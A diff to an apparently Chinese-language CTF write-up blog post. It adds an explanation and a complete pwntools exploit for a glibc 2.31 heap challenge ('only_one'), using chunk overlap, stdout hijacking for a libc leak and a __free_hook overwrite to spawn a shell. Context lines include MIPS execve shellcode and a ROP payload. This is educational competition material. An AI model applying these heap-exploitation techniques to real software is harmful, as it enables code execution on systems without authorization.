@@ -5,9 +5,9 @@ categories: 2025-sheng
 tags: houseof
 ---
 
-决赛依然只出了一道，easy_calc出了，但是做的时候思路没有很清晰，所以花了比较久时间才出
+决赛依然只出了一道easy_calc，但是做的时候思路没有很清晰，所以花了比较久时间才出
 
-后来剩一个小时看了眼only_one，大致猜到用初赛一样的houseofbotcake去打，劫持stdout，第一次用来泄漏，第二次用来劫持，可惜一个小时几乎没可能做出来
+后来剩一个小时看了眼only_one，大致猜到用初赛一样的houseofbotcake去打，劫持stdout用来泄漏，可惜一个小时几乎没可能做出来
 
 另外一道mips，当时想到可以用pwntools的shellcraft去构造shellcode，但是忘记了异构题有些不开nx，可以直接打ret2shellcode。有点思维僵化了，当时在想mips怎么打rop
 ```python
@@ -18,8 +18,6 @@ In [2]: context(arch='mips', log_level='debug')
 In [3]: shellcraft.mips.execve('/bin/sh', 0, 0)
 Out[3]: "    /* execve(path='/bin/sh', argv=0, envp=0) */\n    /* push b'/bin/sh\\x00' */\n    li $t1, 0x6e69622f\n    sw $t1, -8($sp)\n    li $t9, ~0x68732f\n    not $t1, $t9\n    sw $t1, -4($sp)\n    addiu $sp, $sp, -8\n    add $a0, $sp, $0 /* mov $a0, $sp */\n    slti $a1, $zero, 0xFFFF /* $a1 = 0 */\n    slti $a2, $zero, 0xFFFF /* $a2 = 0 */\n    /* call execve() */\n    ori $v0, $zero, SYS_execve\n    syscall 0x40404\n"
 ```
-
-这里先记录下easy_calc的思路，有空在把only_one的补上
 
 # easy_calc
 
@@ -97,6 +95,127 @@ sh = libc + 0x1B45BD
 system = libc + 0x522AB
 payload = build_payload(rdi, sh, system, 0x0)
 io.sendlineafter(b'input:\n', payload)
+
+io.interactive()
+```
+
+# only_one
+
+程序允许申请释放堆块，申请功能最多执行0x14次，并且限制申请size小于0x100，并且没有edit功能只有在申请时才能写入，释放的时候有清理指针，没有uaf。而且没有show函数。但是给了唯一一次的不清理指针的free。
+
+> libc版本为2.31
+
+思路是通过不清理指针的free构造unsortedbin和tcachebin的重叠，覆写unsortedbin的libc指针到stdout(1/16概率)，随后利用对stdout的控制进行libc指针泄漏。利用前面uaf构造好的伪堆块再执行一次tcachebin attack，这次把__free_hook给写为system即可，然后释放一个内容为/bin/sh的堆块获取shell
+
+我认为有两个难点，一个是unsortedbin和tcachebin的重叠，一个是提前布局好后续的伪堆块。
+
+由于需要在tcachebin->fd的位置留下unsortedbin的指针，我先想到的是先把堆块释放进tcachebin，再释放这个堆块至unsortedbin，但是由于tcachebin存在对double free的检查，在将同个堆块释放进unsortedbin时会有double free检查失败。看到其他队伍的解法是切分unsortedbin来覆写tcachebin的指针，看到就恍然大悟了😂
+
+另外一个点在于第一次的uaf要拿来打stdout，那怎么为第二次的tcachebin做准备呢。可以看看下面我如何在重叠时继续构造下一步可利用的uaf
+![heap](./2025sheng-final/heap.png)
+
+这里时拆分一部分unsortedbin，先是把tcachebin的fd覆写为stdout，为泄漏做准备。另外是在等会拿出`tcachebins[0xf0][0/7]`的时候可以去篡改下一个堆块的大小，主要是unsortedbin不好直接利用，毕竟他不是像tcachebin那样的大链表，也不会被smash into tcachebin。
+![heap1](./2025sheng-final/heap1.png)
+
+所以这里的想法就是把这个堆块先拿出来，篡改size后再释放，就可以再构造overlapping
+![heap2](./2025sheng-final/heap2.png)
+
+这里在拿出0xf0的tcachebin的时候顺便篡改size，构造了overlapping。可以看到`0x55555555eb10`这个堆块是我们申请出来的堆块
+![heap3](./2025sheng-final/heap3.png)
+
+随后就很简单了不再赘述，只需要利用这个overlapping来再打一次tcachebin attack劫持__free_hook就行
+
+```python
+from pwn import *
+
+context(
+    terminal=['kitty'],
+    os='linux',
+    arch='amd64',
+    log_level='info',
+)
+
+
+def debug(io):
+    gdb.attach(
+        io,
+        """
+b add
+b dele
+""",
+    )
+
+
+io = process('./pwn')
+idx = 0
+
+
+def add(size: int, cont: bytes = b'a'):
+    global idx
+    log.info('add 0x%x chunk, size as 0x%x', idx, size)
+    idx += 1
+    io.sendlineafter(b'> ', b'1')
+    io.sendlineafter(b'Size: ', (str(size).encode()))
+    io.sendafter(b'Content: ', cont)
+
+
+def delete(idx: int):
+    log.info('delete 0x%x chunk', idx)
+    io.sendlineafter(b'> ', b'2')
+    io.sendlineafter(b'Index: ', (str(idx).encode()))
+
+
+def only_one(idx: int):
+    log.info('use only_one to delete %d chunk', idx)
+    io.sendlineafter(b'> ', b'999')
+    io.sendlineafter(b'you: ', (str(idx).encode()))
+
+
+for _ in range(0x9):
+    add(0xE0)
+add(0x20)
+for i in range(0x7):
+    delete(i)
+
+only_one(8)
+delete(7)
+add(0xE0)
+delete(8)
+add(0x60)
+add(0x70)
+
+add(0x70, b'\xa0\x06\xfc')
+add(0x60)
+
+fake_chunk = flat({0x78: 0xA1}, filler=b'\x00')
+add(0xE0, fake_chunk)
+
+fake_stdout = flat(
+    0xFBAD1800,
+    0x0,
+    0x0,
+    0x0,
+    b'\x00',
+)
+
+add(0xE0, fake_stdout)
+io.recvuntil(b'\x00' * 8)
+libc = u64(io.recv(0x6).ljust(8, b'\x00')) - 0x1EC980
+log.success('libc_base: ' + hex(libc))
+
+add(0x20)
+delete(0x11)
+delete(0x9)
+delete(0xE)
+
+fake_chunk = flat(
+    {0x0: b'/bin/sh', 0x60: 0x70, 0x68: 0x31, 0x70: (libc + 0x1EEE48)},
+    filler=b'\x00',
+)
+add(0x90, fake_chunk)
+add(0x20)
+add(0x20, p64(libc + 0x52290))
+delete(0x12)
 
 io.interactive()
 ```
